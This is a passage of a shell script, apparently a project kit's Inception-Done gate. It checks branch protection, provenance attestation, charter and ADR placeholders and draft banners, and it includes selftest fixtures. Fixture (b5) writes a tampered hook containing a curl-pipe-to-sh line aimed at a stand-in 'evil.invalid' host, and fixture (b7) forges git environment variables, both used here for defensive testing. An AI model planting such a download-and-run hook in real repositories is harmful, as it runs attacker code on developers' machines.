  if [ -z "$_remote" ]; then
    if [ "$MODE" = surface ]; then
      echo "OUTSTANDING: branch protection — no remote configured yet; protect main on the remote before entering the loop"
    else
      echo "FAIL: branch protection — no remote configured; main cannot be protected (not loop-ready). Add a protected remote, or run --surface for the local-surface check"; fail=1
    fi
  else
    case "$_remote" in
      *github.com*)
        # OUTPUT is read, not only rc (V1 repair PR 2): since B4 the live leg names declared-but-unbound
        # contexts on rc 1, and an incepted repo now DECLARES the four gates incept installs — "protected"
        # with none bound is the fail-open state this leg refuses, so it is named with the remedy.
        if _bpo=$(sh conformance/branch-protection.sh --raw 2>/dev/null); then _bp=0; else _bp=$?; fi
        # The names are TREE-CONTROLLED text reaching the operator's display: sanitized (R-3: no control
        # bytes, bounded), and they can only NARROW the verdict to a FAIL — nothing parsed here can produce
        # a PASS, with ONE exception (SWAS-814): on the plan-limit path of the rc 2 arm below, a ratified,
        # unexpired branch-protection-plan row in the tree's own WAIVER-REGISTER.md prints WAIVED (still
        # NOT ENFORCED) instead of FAIL, and echoes that row's bounded owner and expiry.
        # Producer wording is mirror-locked by selftest cell h4m so a reword cannot degrade the remedy.
        _bpu=$(printf '%s\n' "$_bpo" | sed -n 's/^FAIL: required-check context(s) declared in .* but not live on [^:]*: \(.*\) — run: .*$/\1/p' | head -1 | tr -d '[:cntrl:]' | cut -c1-200)
        _bpf=$(printf '%s\n' "$_bpo" | grep -c '^FAIL:' || true)   # rc 1 is COMPOUND: the unbound arm is taken only when it is the SOLE failure; `|| true`: grep -c exits 1 on a count of 0 and set -e would end the gate before any verdict # MUT-BPCOUNT
        case "$_bp" in
          0) echo "PASS: verified protected (main, GitHub)" ;;
          1) if [ -n "$_bpu" ] && [ "$_bpf" = 1 ]; then
               # surface = OUTSTANDING (a post-first-CI-run keystroke fixes it); any OTHER failure (no reviews
               # required, protection absent) stays FAIL in both modes and is echoed below.
               if [ "$MODE" = surface ]; then
                 echo "OUTSTANDING: branch protection — main is protected but declared required context(s) are NOT bound: ${_bpu} — run: sh scripts/branch-protection-apply.sh --apply (after the first CI run)"
               else
                 echo "FAIL: branch protection — main is protected but declared required context(s) are NOT bound: ${_bpu} — the gates incept installed do not block a merge until bound; run: sh scripts/branch-protection-apply.sh --apply"; fail=1
               fi
             else
               printf '%s\n' "$_bpo" | grep '^FAIL:' | tr -d '[:cntrl:]' | cut -c1-240 | sed 's/^/  /'
               echo "FAIL: branch protection — main is NOT protected on GitHub (required PR reviews / status checks missing)"; fail=1
             fi ;;
          2) # RT5-Q4: the live leg (--raw) cannot verify GitHub, but the RD-4 vacuous-tracker check
             # is a purely OFFLINE, local-tree read (never touches gh) — run it separately so an
             # incepted repo with a declared-but-vacuous tracker-board-gates is still refused even
             # when GitHub itself is unreachable/unauthenticated. Own line, own fail=1, never folded
             # into the "GitHub state unverifiable" summary below (that summary stays OUTSTANDING/
             # FAIL purely about verifiability; this is a DIFFERENT, always-actionable defect).
             if _bpdo=$(sh conformance/branch-protection.sh --declared-only 2>/dev/null); then _bpdorc=0; else _bpdorc=$?; fi
             case "$_bpdo" in
               *'tracker-board-gates is declared required but this tree'"'"'s backlog backend is md'*)
                 echo "FAIL: branch protection — $(printf '%s\n' "$_bpdo" | grep '^FAIL:' | head -1 | tr -d '[:cntrl:]' | cut -c1-240 | sed 's/^FAIL: //')"; fail=1 ;;
             esac
             # The upgrade-403 cause (SWAS-212): matched on a FIXED anchor in the producer's stdout line, and the
             # operator reads FIXED kit text below — the stub's or the tree's own text is never echoed, with ONE
             # exception (SWAS-814): the WAIVED line below echoes a ratified waiver row's owner (bounded) and expiry.
             # Producer wording is mirror-locked by the branch-protection selftest, which pins this phrase on both sides.
             _bpplan=0
             case "$_bpo" in
               *'UNVERIFIED: '*'this plan cannot enforce protection on a private repository (a public repository or a paid plan can)'*)
                 echo "  cause: this plan cannot enforce protection on a private repository (a public repository or a paid plan can)"
                 _bpplan=1 ;;
             esac
             # SWAS-814: ONLY on the plan-limit cause, ask the kit's own waivers-valid.sh whether the tree's register
             # holds a ratified, filled, unexpired branch-protection-plan row (its rc is honoured: any non-zero, a
             # missing checker included, is no waiver). A row never reaches any other cause (gh missing or
             # unauthenticated, an inaccessible remote), rc 1, the vacuous-tracker FAIL above, or any other leg.
             _bpwaived=0
             if [ "$_bpplan" = 1 ]; then   # MUT-BPPLAN
               if _bpw=$(sh "$WAIVERS_SH" --active branch-protection-plan ./WAIVER-REGISTER.md 2>/dev/null); then   # MUT-BPRC
                 _bpwo=$(printf '%s\n' "$_bpw" | head -1 | cut -f1 | tr -d '[:cntrl:]' | cut -c1-60)
                 _bpwe=$(printf '%s\n' "$_bpw" | head -1 | cut -f2 | tr -d '[:cntrl:]' | cut -c1-10)
                 printf '%s\n' "WAIVED: branch protection — NOT ENFORCED: this plan cannot enforce protection on a private repository; waived by ${_bpwo} until ${_bpwe} (exit: make the repository public, or move to a paid plan)"   # MUT-BPNE
                 _bpwaived=1   # MUT-BPFAIL
               else
                 echo "  waiver route: a ratified, unexpired branch-protection-plan row in WAIVER-REGISTER.md at the repository root (templates/WAIVER-REGISTER.md) records this plan limit; START-HERE.md §3"
               fi
             fi
             if [ "$_bpwaived" = 1 ]; then
               :
             elif [ "$MODE" = surface ]; then
               echo "OUTSTANDING: branch protection — GitHub state unverifiable (gh missing/unauthenticated, OR the remote repo is inaccessible/nonexistent); re-run authenticated against a live repo, or in CI"
             else
               echo "FAIL: branch protection — GitHub state unverifiable (gh missing/unauthenticated, OR the remote repo is inaccessible/nonexistent) and verification is required (strict); authenticate gh / check the remote exists, or run --surface"; fail=1
             fi ;;
          *) echo "FAIL: branch protection — branch-protection.sh returned an unexpected status ($_bp); fail-closed"; fail=1 ;;
        esac ;;
      *)
        _bpl=$(grep -E '^\- \*\*Branch protection\*\*' CLAUDE.md 2>/dev/null | head -1 || true)
        _bpv=$(printf '%s' "$_bpl" | sed 's/^.*(§branch-protection): *//')
        # A real attestation is "attested:<...>" with NO residual template placeholder markers
        # (< > [ ]); an adopter who leaves the angle-bracket placeholder is NOT attested (fail-closed,
        # same discipline as the Target harness placeholder guard above).
        _attested=0
        case "$_bpv" in attested:*) _attested=1 ;; esac
        case "$_bpv" in *'<'*|*'>'*|*'['*|*']'*) _attested=0 ;; esac
        if [ "$_attested" = 1 ]; then
          echo "PASS: branch protection attested (non-GitHub host) [${_bpv}]"
        elif [ "$MODE" = surface ]; then
          echo "OUTSTANDING: branch protection — non-GitHub remote, no valid attestation recorded (stamp '- **Branch protection** (§branch-protection): attested: HOST and MECHANISM' in CLAUDE.md, no angle brackets; docs/adoption/vc-hosts.md)"
        else
          echo "FAIL: branch protection — non-GitHub remote and no valid recorded attestation (stamp '- **Branch protection** (§branch-protection): attested: HOST and MECHANISM' in CLAUDE.md, no angle brackets, or run --surface); docs/adoption/vc-hosts.md"; fail=1
        fi ;;
    esac
  fi
fi

# ── B8 §4.3 (GATE-PROVENANCE-SELF-DISABLES-AND-NEVER-GATES-THE-MERGE, PHASE-B-SPINE) — the
# gate-provenance repo-class leg. MODE strict (default) | surface, same shape as the
# branch-protection leg above. Trigger: the incepted tree DERIVES deployable (Dockerfile OR any
# workflow wf_is_deploy — deployable-ready.sh's own derivation, reused, not re-invented) AND the
# forge probe reports isPrivate. SWAS-813: who OWNS the repo no longer decides anything. GitHub offers
# attestations on a public repository, and on a private one only with GitHub Enterprise Cloud, so on a
# private repository the SLSA provenance/image-provenance attest step(s) run only when the repository or
# organization variable KIT_ATTEST_PRIVATE is true (profiles/*/ci.yml, provenance-precondition.sh-locked), and
# nothing else would surface that gap once Inception passes. Order of the verdicts: declared (`_id_attest_state`)
# PASS; then a validated `na` disposition for gate-provenance, a conscious decision that is not blocked twice
# (N/A, whatever the read said); then unverifiable (403 or any other status) FAIL/OUTSTANDING, never a PASS;
# then absent, FAIL/OUTSTANDING with the cure.
# The declaration is read locally through the API only: no profile CI runs this gate live (verify.sh registers
# only its --selftest), so there is no CI-env leg, and an exported KIT_ATTEST_PRIVATE is never read here.
if [ "$is_repo" -ne 1 ]; then
  echo "SKIP: gate-provenance repo-class leg — not a git repository (see the repo failure above)"
else
  _id_deployable=0
  [ -f Dockerfile ] && _id_deployable=1
  if [ "$_id_deployable" -eq 0 ] && [ -d .github/workflows ]; then
    for _id_wf in .github/workflows/*.yml .github/workflows/*.yaml; do
      [ -f "$_id_wf" ] || continue
      if wf_is_deploy "$_id_wf"; then _id_deployable=1; break; fi
    done
  fi
  if [ "$_id_deployable" -eq 0 ]; then
    echo "N/A: gate-provenance repo-class — no deploy surface (no Dockerfile / deploy workflow); not a deployable service"
  else
    # Direct expansion, NOT `sh -c "$VAR"` — preflight.sh's check_repo_class's own precedent for this
    # exact probe (`${PREFLIGHT_GH_CMD:-gh repo view ...}`). `sh -c "$VAR"` hands the string to a FRESH
    # shell for full re-parsing, so a JSON fixture's unquoted `{...,...}` undergoes brace expansion
    # there (measured on this box's /bin/sh, bash-as-sh) and silently mangles the stub's own JSON.
    # Direct expansion evaluates the variable's value as an already-expanded word (split, not
    # re-parsed), so the braces stay literal — the same reason scripts/preflight.sh's identical
    # fixture shape works.
    # [reviewer Minor-5b + security LOW-2, fix round 1] INCEPTION_DONE_GH_CMD trust class: it is
    # honored ONLY from the invoker's OWN environment, by direct expansion — never re-parsed from
    # repo/PR content, and there is no code path that lets a repository's own files set it. Same
    # tier as PREFLIGHT_GH_CMD (trusted-invocation-only; see that script's own SECURITY header).
    _id_gh_json=""
    # SWAS-945: the pin was set once, above the branch-protection leg, so these reads inherit it.
    if [ -n "${INCEPTION_DONE_GH_CMD:-}" ] || command -v gh >/dev/null 2>&1; then
      _id_gh_json=$(${INCEPTION_DONE_GH_CMD:-gh repo view --json isPrivate} 2>/dev/null) || _id_gh_json=""
    fi
    if [ -z "$_id_gh_json" ] || ! command -v jq >/dev/null 2>&1; then
      if [ "$MODE" = surface ]; then
        echo "OUTSTANDING: gate-provenance repo-class — GitHub repo visibility unverifiable (gh/jq missing/unauthenticated, or an unresolvable remote); re-run authenticated, or in CI"
      else
        echo "FAIL: gate-provenance repo-class — GitHub repo visibility unverifiable and verification is required (strict); authenticate gh + install jq, or run --surface"; fail=1
      fi
    else
      _id_priv=$(printf '%s' "$_id_gh_json" | jq -r '.isPrivate' 2>/dev/null || echo "")
      # [security MED-1, fix round 1] a PARSE FAILURE — the field is anything other than exactly
      # `true` or `false` (garbage JSON, a jq error swallowed above, a schema change) — is
      # UNVERIFIABLE, never the affirmative public PASS below. Checked BEFORE the true/false
      # branch, mirroring the no-gh/no-jq arm's own posture (strict FAIL / surface OUTSTANDING),
      # never a silent green on a value this gate could not actually parse.
      case "$_id_priv" in true|false) : ;; *) _id_priv="" ;; esac
      if [ -z "$_id_priv" ]; then
        if [ "$MODE" = surface ]; then
          echo "OUTSTANDING: gate-provenance repo-class — GitHub repo visibility unverifiable (malformed/unparseable gh response); re-run authenticated, or in CI"
        else
          echo "FAIL: gate-provenance repo-class — GitHub repo visibility unverifiable (malformed/unparseable gh response) and verification is required (strict); re-authenticate gh, or run --surface"; fail=1
        fi
      elif [ "$_id_priv" = "true" ]; then   # MUT-ORG
        _id_attest_state
        _id_gpdisp=$(sh "$CI_GATES_SH" --disposition gate-provenance conformance/gate-dispositions.txt || echo apply)
        if [ "$_id_as" = declared ]; then
          echo "PASS: gate-provenance repo-class — a private repository that declares GitHub Enterprise Cloud (KIT_ATTEST_PRIVATE is true); the SLSA provenance job(s) can run"
        elif [ "$_id_gpdisp" = na ]; then
          # Order (R2): declared, then a validated na, then unverifiable, then absent. A recorded na decides the question
          # whatever the variable read said, so a token that cannot read variables never blocks an adopter who has said na.
          # [security LOW-3, fix round 1] strip control characters from the echoed reason — a
          # disposition file's reason field is free text this gate does not own the review of.
          _id_reason=$(awk -F'\t' '!/^[[:space:]]*#/ && $1=="gate-provenance" && NF>=3 {print $3}' conformance/gate-dispositions.txt 2>/dev/null | head -1 | tr -d '[:cntrl:]')
          echo "N/A: gate-provenance repo-class — a private deployable repo without a verified KIT_ATTEST_PRIVATE declaration, but gate-provenance is validated na (${_id_reason:-reason on file}) — a conscious decision, not silence"
        elif [ "$_id_as" = unverifiable ]; then
          if [ "$MODE" = surface ]; then
            echo "OUTSTANDING: gate-provenance repo-class — a private repository whose KIT_ATTEST_PRIVATE declaration is unverifiable (gh could not read the repository or organization variable: no access, or an unexpected status); re-run authenticated with access to repository variables"
          else
            echo "FAIL: gate-provenance repo-class — a private repository whose KIT_ATTEST_PRIVATE declaration is unverifiable and verification is required (strict); authenticate gh with access to repository variables, or run --surface"; fail=1
          fi
        elif [ "$MODE" = surface ]; then
          echo "OUTSTANDING: gate-provenance repo-class — a private deployable repo; GitHub offers attestations on a private repository only with Enterprise Cloud, so the SLSA provenance attest step(s) are skipped here (profiles/*/ci.yml). Make the repo public, declare Enterprise Cloud by setting the KIT_ATTEST_PRIVATE variable (repository or organization) to true, or record a dated na disposition for gate-provenance in conformance/gate-dispositions.txt."
        else
          echo "FAIL: gate-provenance repo-class — a private deployable repo cannot pass Inception silently provenance-less; GitHub offers attestations on a private repository only with Enterprise Cloud, so the SLSA provenance attest step(s) are skipped here (profiles/*/ci.yml). Make the repo public, declare Enterprise Cloud by setting the KIT_ATTEST_PRIVATE variable (repository or organization) to true, or record a dated na disposition for gate-provenance in conformance/gate-dispositions.txt."; fail=1
        fi
      else
        echo "PASS: gate-provenance repo-class — repo is public; the SLSA provenance job(s) can run"
      fi
    fi
  fi
fi

# ── Decided-not-present legs (INCEPTION-DONE-DECIDED-NOT-PRESENT, 2026-09-01). STRICT ONLY: --surface
#    is "what incept scaffolded", and incept stamps the charter and ADR-000 PLACEHOLDERS by design
#    (its epilogue steps 1-2 are human judgment), so surface stays green right after incept and strict
#    reds until both decisions are recorded. Measured defect (ten-lens eval, 2026-09-01): strict
#    returned OK with §1 Overview still `[what problem this solves, for whom]` and ADR-000 still the
#    unfilled example — the exit gate proved presence, not decision.
#    Honest ceiling: what is detected is the TEMPLATE placeholder. A deleted section or a one-word
#    charter passes; whether the decision is GOOD stays the owner's Go/No-Go. The ADR leg reuses the
#    decision-integrity engine's own verdict: its unfilled-example N/A (correct for a lint that runs
#    all loop long) is a FAIL at THIS gate, and so is an absent ADR. Fail-closed if the engine is absent.
if [ "$MODE" = strict ]; then
  _id_ph=$(grep -c -F -e '[what problem this solves, for whom]' -e "[how we know it's working]" -e "[what's explicitly in / out]" CLAUDE.md 2>/dev/null || true)
  if [ "${_id_ph:-0}" -gt 0 ]; then
    echo "FAIL: charter undecided — CLAUDE.md §1 Overview still carries $_id_ph template placeholder line(s) (Problem / Vision / Scope); write the charter prose (incept epilogue step 1)"; fail=1
  else
    echo "PASS: charter decided — no §1 Overview template placeholder remains in CLAUDE.md"
  fi
  _id_adr=docs/architecture/ADR-000-stack.md
  if [ ! -f "$_id_adr" ]; then
    echo "FAIL: stack decision unrecorded — $_id_adr absent; record the real stack decision (incept epilogue step 2)"; fail=1
  else
    _id_dv=$(sh conformance/decision-integrity.sh stack "$_id_adr" 2>&1 || true)
    case "$_id_dv" in
      *"PASS:"*) echo "PASS: stack decision recorded — ADR-000 fit rationale cites a fit dimension" ;;
      *"unfilled example"*) echo "FAIL: stack decision unrecorded — $_id_adr fit rationale is still the unfilled example (incept epilogue step 2)"; fail=1 ;;
      *) echo "FAIL: stack decision — decision-integrity verdict: ${_id_dv:-UNVERIFIED (conformance/decision-integrity.sh not runnable)}"; fail=1 ;;
    esac
  fi
else
  echo "surface: charter + ADR-000 decision legs deferred to strict (incept epilogue steps 1-2 are judgment, not scaffold)"
fi

# ── The inception-drafts leg (SWAS-779). Inception cannot be graded done on unratified drafts: strict FAILS while docs/inception-draft/
#    exists, or while any of the four ratified files still carries the draft banner line; --surface reports each as OWED and never fails
#    on it. The match is the WHOLE line, anchored, against the hard-coded literal above. A missing file is "no banner" (BACKLOG.md is
#    absent on a tracker-backed board); an unreadable file is a FAIL, read from grep's own exit code (0 found, 1 not found, 2 trouble),
#    as the first-deploy set below reads it. Honest ceiling: the gate sees text, so a person's review of the PR that moves a draft into
#    place is the control, not this leg.
_id_drn=0
_id_dremit() {
  if [ "$MODE" = strict ]; then echo "FAIL: inception drafts unratified — $1"; fail=1; else echo "OWED (inception drafts): $1"; fi
  _id_drn=$((_id_drn + 1))
}
#    The banner is matched after the carriage returns are removed and the whitespace around the line is trimmed, so a CRLF file or a banner
#    with trailing spaces is still the banner line. A regular FILE named docs/inception-draft counts as the directory.
if [ -e docs/inception-draft ] || [ -L docs/inception-draft ]; then _id_dremit "docs/inception-draft/ still exists; move what is right into place, then delete it"; fi   # MUT-DRDIR
for _id_drf in CLAUDE.md docs/architecture/ADR-000-stack.md RUNBOOK.md BACKLOG.md; do
  [ -e "$_id_drf" ] || [ -L "$_id_drf" ] || continue
  _id_drr=0
  if [ ! -r "$_id_drf" ]; then _id_drr=2
  else tr -d '\r' < "$_id_drf" | sed 's/^[[:space:]]*//; s/[[:space:]]*$//' | grep -qxF -e "$ID_DRAFT_BANNER" -e "$ID_DRAFT_BANNER_OWNER" || _id_drr=$?   # MUT-DRBANNER
  fi
  case "$_id_drr" in
    0) _id_dremit "$_id_drf still carries the draft banner line; a person reviews it, edits it and removes the banner" ;;
    1) : ;;
    *) _id_dremit "$_id_drf could not be read, so it cannot be shown free of the draft banner" ;;   # MUT-DRUNREAD
  esac
done
if [ "$_id_drn" -eq 0 ]; then
  if [ "$MODE" = strict ]; then echo "PASS: no inception draft remains — docs/inception-draft/ is absent and no ratified file carries the draft banner"; else echo "surface: no inception draft present"; fi
fi

# ── The first-deploy set (SWAS-769, option A). Eight items are owed before the first production deploy, not before
#    the first slice, so nothing here is graded: each prints one OWED line and the loop-entry verdict below is not
#    read from them, in either mode. A line is a reminder, not a proof: `owed` means the file is missing or still
#    carries its template placeholder; `filled` means only that the placeholder is gone (a stub BIA reads filled), and a
#    human still judges the content. `N/A` for bia and rb-dr when the project is not data-backed, by the same
#    has_data_surface rule `readiness.sh dr-ready` applies. The gate that makes these block a deploy is a later card.
for _id_ow in $ID_FIRST_DEPLOY_IDS; do
  _id_owed_spec "$_id_ow" || continue
  case "$_id_ow" in
    bia|rb-dr)
      if ! has_data_surface .; then echo "OWED (first-deploy set): $_id_ow — N/A — $_id_owf"; continue; fi ;;
  esac
  if [ ! -f "$_id_owf" ]; then _id_ows=owed
  elif [ -z "$_id_owt" ]; then _id_ows=filled
  else
    # grep exit: 0 placeholder found (owed), 1 not found (filled), 2 unreadable (owed: a file that cannot be read is not shown filled)
    if grep -qF -e "$_id_owt" "$_id_owf" 2>/dev/null; then _id_ows=owed
    else
      case $? in 1) _id_ows=filled ;; *) _id_ows=owed ;; esac
    fi
  fi
  echo "OWED (first-deploy set): $_id_ow — $_id_ows — $_id_owf"
done

if [ "$fail" -ne 0 ]; then echo "FAIL: Inception-Done gate not satisfied in '$DIR'"; return 1; fi
echo "OK: Inception-Done gate satisfied in '$DIR'"
return 0
}

# ─────────────────────────────────────────────────────────────────────────────────────────────
# selftest() is the non-vacuity ORACLE MARKER: non-vacuity.sh mutates only lines strictly ABOVE
# this definition (the run_gate accumulators), then runs this --selftest; a neutered FAIL path that
# no fixture below catches is a VACUOUS check. So every FAIL verdict run_gate can print has a
# negative fixture here that asserts BOTH the SPECIFIC message AND the gate-not-satisfied return —
# an echo survives mutation, only the accumulator+return do not, so message-plus-return is the tooth.
# Fixtures are built with git clone (NEVER adopter-export — a kit-self surface would go N/A on an
# export tree). The st_* helpers and the st_fail accumulator live BELOW this marker so the mutation
# harness cannot neuter the test's own bookkeeping. Keep no literal <var>=1 token in any comment
# above this line (it would be a phantom accumulator to the lexer-less mutator).
selftest() {
  _ID_SEAMS=1   # the variable-read seam is live only in here (see _id_attest_state)
  set +e   # the harness asserts explicitly; a fixture's non-zero return must not abort the sweep
  st_fail=0
  ROOT=$(unset CDPATH; cd "$(dirname "$0")/.." && pwd)
  WORK=$(mktemp -d)
  # Build the once-cloned fixture template. seed_fixture_template (below the oracle marker with the
  # st_* helpers) decides clone-vs-worktree-seed; its header documents the three cases (CP-5 + K9).
  if ! seed_fixture_template "$ROOT" "$WORK/tmpl"; then
    return 1
  fi

  # (a) tree with NO .git -> FAIL "not a git repository"
  echo "--- (a) no .git repository ---"
  d=$(st_mkfix a claude-code); st_install_hook "$d"; rm -rf "$d/.git"
  st_run "$d"
  st_has "FAIL: not a git repository"
  st_has "FAIL: Inception-Done gate not satisfied"
  st_rc 1

  # (b) repo but NO pre-push hook -> FAIL "pre-push git hook missing"
  echo "--- (b) repo, no pre-push hook ---"
  d=$(st_mkfix b claude-code); rm -f "$d/.git/hooks/pre-push"
  st_run "$d"
  st_has "PASS: git repository present"
  st_has "FAIL: pre-push git hook missing"
  # A7: the remedy text IS the control surface — pin it so a regression to "re-run incept" reds.
  st_has "cp hooks/pre-push"
  st_has "do NOT re-run incept"
  st_has "FAIL: Inception-Done gate not satisfied"
  st_rc 1

  # (b2) TRACKED-HOOKS mode (HOOK-INSTALL-RECURS-PER-SLICE Δ6) -> PASS with NO installed copy at all.
  # The gate's hook leg must accept EITHER install mode; before Δ6 it hard-coded the default hooks
  # path, so the one-time `core.hooksPath` keystroke that ends the re-copy treadmill left this gate
  # failing forever — and docs/adoption/brownfield.md said so out loud. st_tracked REMOVES the copy,
  # so this green can only come from the tracked hooks/pre-push being the live hook.
  echo "--- (b2) tracked-hooks mode (no installed copy) ---"
  d=$(st_mkfix b2 claude-code); st_tracked "$d"
  st_run "$d" surface
  st_has "PASS: git repository present"
  st_has "PASS present: pre-push git hook live"
  st_has "tracked-hooks mode"
  st_hasnt "FAIL: pre-push git hook missing"

  # (b3) tracked-hooks mode, hook NOT executable -> FAIL. The gate keeps its teeth in the new mode:
  # git silently ignores a non-executable hook, and in THIS mode the exec bit is a tracked file mode,
  # so the remedy is chmod + commit, never a re-copy.
  echo "--- (b3) tracked-hooks mode, hook not executable ---"
  d=$(st_mkfix b3 claude-code); st_tracked "$d"; chmod -x "$d/hooks/pre-push"
  st_run "$d"
  st_has "FAIL: pre-push git hook present but not executable"
  st_has "FAIL: Inception-Done gate not satisfied"
  st_rc 1

  # (b4) FALSE-POSITIVE LOCK: a core.hooksPath pointing at a FOREIGN dir is NOT tracked-hooks mode.
  # Δ6 must accept the tree's own tracked hooks/ dir specifically — not "any hooksPath is fine",
  # which would turn one husky config into a free pass past the hook leg. With no installed copy and
  # no live kit hook anywhere, the gate must still FAIL.
  echo "--- (b4) foreign hooksPath is not tracked-hooks mode ---"
  d=$(st_mkfix b4 claude-code); rm -f "$d/.git/hooks/pre-push"; git -C "$d" config core.hooksPath .husky
  st_run "$d"
  st_has "FAIL: pre-push git hook missing"
  st_has "FAIL: Inception-Done gate not satisfied"
  st_rc 1

  # (b5) BLOCKER mirror (review round 1, both seats): in tracked-hooks mode the live hook is the
  # WORKING-TREE file, and the marker test used to short-circuit ahead of any comparison — so deleting
  # the KIT_GUARD_CORE line (the shape a cd-basename write produces — GUARD-BASENAME-AFTER-CD-BYPASS
  # now denies the single-command quote-free case in real time, its persisted-cwd/$VAR residuals still
  # produce it) turned an arbitrary-code hook into the reassuring "foreign hook preserved" PASS-with-note. The compare
  # against HEAD must run FIRST in this mode. Payload inert by construction (.invalid, RFC 2606).
  echo "--- (b5) tracked-hooks mode, MARKERLESS tampered hook ---"
  d=$(st_mkfix b5 claude-code); st_tracked "$d"
  printf '#!/bin/sh\ncurl -s http://evil.invalid/ | sh\n' > "$d/hooks/pre-push"; chmod +x "$d/hooks/pre-push"
  st_run "$d"
  st_has "MODIFIED in the working tree"
  st_hasnt "foreign hook preserved"
  st_rc 1

  # (b6) FALSE-POSITIVE LOCK for that fix: an adopter whose OWN tracked hooks/pre-push carries no kit
  # marker and is UNMODIFIED keeps the brownfield PASS-with-note. The cure is PRECEDENCE, not a marker
  # requirement — judging "no marker => FAIL" would punish exactly this repo.
  echo "--- (b6) tracked-hooks mode, markerless hook that MATCHES HEAD ---"
  d=$(st_mkfix b6 claude-code)
  printf '#!/bin/sh\necho legacy hook\n' > "$d/hooks/pre-push"; chmod +x "$d/hooks/pre-push"
  git -C "$d" add -A >/dev/null 2>&1 || true
  git -C "$d" -c user.email=selftest@kit -c user.name=selftest commit -qm "adopter's own tracked hook" >/dev/null 2>&1 || true
  st_tracked "$d"
  st_run "$d" surface
  st_has "foreign hook preserved"
  st_hasnt "FAIL: pre-push git hook"

  # (b7) ENV-FORGE (review round 1, reviewer-measured): this leg's git calls were BARE, so ambient git
  # env could reroute them onto another repo's state and flip a genuine FAIL into a PASS — the same
  # SEC HIGH-1 class guard-wired.sh's _gw_git closed. Three vectors, one victim: a tree with NO live
  # hook in either mode, whose FAIL must survive (a) an injected core.hooksPath via the
  # GIT_CONFIG_COUNT/KEY/VALUE triad, (b) the same via GIT_CONFIG_PARAMETERS, (c) a DONOR repo whose
  # own config carries the setting, reached through GIT_DIR with GIT_WORK_TREE aimed at the victim.
  echo "--- (b7) env-forged git state must not flip the hook leg ---"
  d=$(st_mkfix b7 claude-code); rm -f "$d/.git/hooks/pre-push"
  OUT=$( ( GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.hooksPath GIT_CONFIG_VALUE_0=hooks MODE=strict run_gate "$d" ) 2>&1 ); RC=$?
  st_has "FAIL: pre-push git hook missing"
  OUT=$( ( GIT_CONFIG_PARAMETERS="'core.hookspath'='hooks'" MODE=strict run_gate "$d" ) 2>&1 ); RC=$?
  st_has "FAIL: pre-push git hook missing"
  b7donor=$(st_mkfix b7donor claude-code); git -C "$b7donor" config core.hooksPath hooks
  OUT=$( ( GIT_DIR="$b7donor/.git" GIT_WORK_TREE="$d" MODE=strict run_gate "$d" ) 2>&1 ); RC=$?
  st_has "FAIL: pre-push git hook missing"

  # (b8) m2 (review round 2) — tracked mode, HEAD exists but hooks/pre-push is NOT committed at HEAD.
  # The old `else` arm read this as _id_hm_rc=0 ("verified match"), so an uncomparable live hook took
  # the "PASS present … live via tracked-hooks mode" line — the fail-OPEN where guard-wired REDs. Now
  # it FAILs, mirroring guard-wired's tracked "missing from HEAD". Built like rung_trackedmissing:
  # unstage+commit the removal so HEAD has commits but no hooks/pre-push blob, then flip to tracked.
  echo "--- (b8) tracked mode, hooks/pre-push not committed at HEAD ---"
  d=$(st_mkfix b8 claude-code)
  git -C "$d" rm --cached -q hooks/pre-push >/dev/null 2>&1
  git -C "$d" -c user.email=selftest@kit -c user.name=selftest commit -qm "drop tracked hook" >/dev/null 2>&1
  st_tracked "$d"
  st_run "$d"
  st_has "not committed at HEAD"
  st_hasnt "live via tracked-hooks mode"
  st_rc 1

  # (b9) m2 — the DELIBERATE divergence from guard-wired: tracked mode on a repo with NO commits at
  # all (HEAD unborn). Not a tamper, and not verified either: an honest N/A that never prints the live
  # PASS (requirement a) and does not false-RED a legitimate pre-first-commit tree (requirement b).
  # Built by re-initialising a cloned fixture so HEAD is unborn while the working tree stays intact.
  echo "--- (b9) tracked mode, unborn HEAD (no commits yet) ---"
  d=$(st_mkfix b9 claude-code); rm -rf "$d/.git"; git -C "$d" init -q >/dev/null 2>&1
  st_tracked "$d"
  st_run "$d" surface
  st_has "HEAD unborn"
  st_has "NOT counted as a verified guard"
  st_hasnt "live via tracked-hooks mode"

  # (c) --harness generic (floor): repo leg live, hook leg live, floor guard-line, NO PreToolUse.
  # We assert the SPECIFIC legs T3 locks, NOT the whole-gate "OK: gate satisfied" verdict — that
  # verdict ALSO requires docs/architecture/ADR-000*.md + BACKLOG.md, both `export-ignore`d
  # (.gitattributes), so asserting it would couple the selftest to the tree it runs in: it would
  # FAIL on an export tree and for any real adopter who runs verify.sh BEFORE creating their
  # ADR/BACKLOG. A selftest must build its OWN world — these three legs print regardless of those.
  echo "--- (c) generic (floor) ---"
  d=$(st_mkfix c generic); st_install_hook "$d"
  st_run "$d" surface
  st_has "PASS: git repository present"
  st_has "PASS present: pre-push git hook installed and executable"
  st_has "runtime guard = floor (git hook + CI backstop); 'generic' has no inline command-guard"
  st_hasnt "PreToolUse"

  # (d) --harness claude-code (native): repo leg live, hook leg live, harness-aware PreToolUse leg.
  # Same rationale as (c): assert the native guard leg (harness-aware PreToolUse), NOT the whole-gate
  # verdict — so the fixture is independent of the export-ignored ADR/BACKLOG.
  echo "--- (d) claude-code (native) ---"
  d=$(st_mkfix d claude-code); st_install_hook "$d"
  st_run "$d" surface
  st_has "PASS: git repository present"
  st_has "PASS present: pre-push git hook installed and executable"
  st_has "'claude-code' runtime guard wired (PreToolUse"

  # (d2) B3 r3 HIGH-A: a FLAGGED proof.check ("<path> --rung1-only") must resolve and EXECUTE
  # correctly, not fail-closed with a false "missing" message. (d) above happens to exercise this
  # too, because the kit's OWN adapters/claude-code/adapter.json currently carries this flag — but
  # that coupling is silent and would stop testing the mirrored parse the moment that manifest's
  # proof.check changes shape. This fixture is self-contained: it manufactures its OWN harness
  # ("fixtureharness") and adapter.json declaring ONLY command-guard, so the assertion never
  # depends on what the real claude-code adapter happens to say. Also the negative half of the
  # cross-consumer guarantee: harness-adapter.sh already asserts this exact shape (its own
  # flagok/flagselftest/flagtrailspace fixtures) — this proves the OTHER declared consumer
  # (inception-done.sh) parses the identical manifest shape the identical way.
  echo "--- (d2) flagged proof.check resolves + executes (HIGH-A mirror) ---"
  d=$(st_mkfix d2 fixtureharness); st_install_hook "$d"
  mkdir -p "$d/adapters/fixtureharness"
  printf '%s\n' '{"dimensions":{"command-guard":{"level":"native","proof":{"check":"conformance/guard-wired.sh --rung1-only"}}}}' > "$d/adapters/fixtureharness/adapter.json"
  st_run "$d" surface
  st_has "'fixtureharness' runtime guard wired (PreToolUse"
